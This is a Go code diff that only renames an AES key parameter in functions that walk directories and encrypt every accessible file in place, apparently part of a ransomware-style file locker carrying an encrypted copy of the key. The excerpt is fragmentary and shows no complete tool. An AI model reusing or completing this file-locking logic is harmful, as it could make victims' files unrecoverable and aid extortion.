@@ -13,7 +13,7 @@ import (
 
 var pl = fmt.Println
 
-func LockFilesInDir(startDirPath string, skipHiddenDirs bool, encryptedAESKey []byte, AESKey []byte) error {
+func LockFilesInDir(startDirPath string, skipHiddenDirs bool, encryptedAESKey []byte, aesKey []byte) error {
 	// scan only non hidden directories
 	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
 	// filesToEncrypt := ScanFilesInDirWithLockAdd(startDirPath, skipHiddenDirs, encryptedAESKey)
@@ -27,7 +27,7 @@ func LockFilesInDir(startDirPath string, skipHiddenDirs bool, encryptedAESKey []
 
 	for _, filePath := range filesToEncrypt {
 		go func(filePath string) error {
-			encryptedFileData, err := enc.EncryptFileAES(AESKey, filePath)
+			encryptedFileData, err := enc.EncryptFileAES(aesKey, filePath)
 			if err != nil {
 				return err
 			}
@@ -41,7 +41,7 @@ func LockFilesInDir(startDirPath string, skipHiddenDirs bool, encryptedAESKey []
 	return nil
 }
 
-func RunEncryptForCurrentDir(encryptedAESKey []byte, AESKey []byte) (fileList []string, err error) {
+func RunEncryptForCurrentDir(encryptedAESKey []byte, aesKey []byte) (fileList []string, err error) {
 
 	// get pwd
 	currentDir, err := os.Getwd()
@@ -49,7 +49,7 @@ func RunEncryptForCurrentDir(encryptedAESKey []byte, AESKey []byte) (fileList []
 		return nil, err
 	}
 
-	LockFilesInDir(currentDir, true, encryptedAESKey, AESKey)
+	LockFilesInDir(currentDir, true, encryptedAESKey, aesKey)
 	pl("current dir: ", currentDir)
 	return fileList, nil
 }
@@ -81,7 +81,7 @@ func GetListOfAccessibleFiles(fileList []string) []string {
 	return fileListWithAccess
 }
 
-func LockFilesArray(filesToEncrypt []string, AESKey []byte) {
+func LockFilesArray(filesToEncrypt []string, aesKey []byte) {
 	// scan only non hidden directories
 
 	// runtime.GOMAXPROCS(16)
@@ -103,7 +103,7 @@ func LockFilesArray(filesToEncrypt []string, AESKey []byte) {
 			// TODO: Make an error chanel and listen to it
 			go func(index int) error {
 				defer wg.Done()
-				_, err := enc.EncryptFileAES(AESKey, filesToEncrypt[index])
+				_, err := enc.EncryptFileAES(aesKey, filesToEncrypt[index])
 				if err != nil {
 					return err
 				}
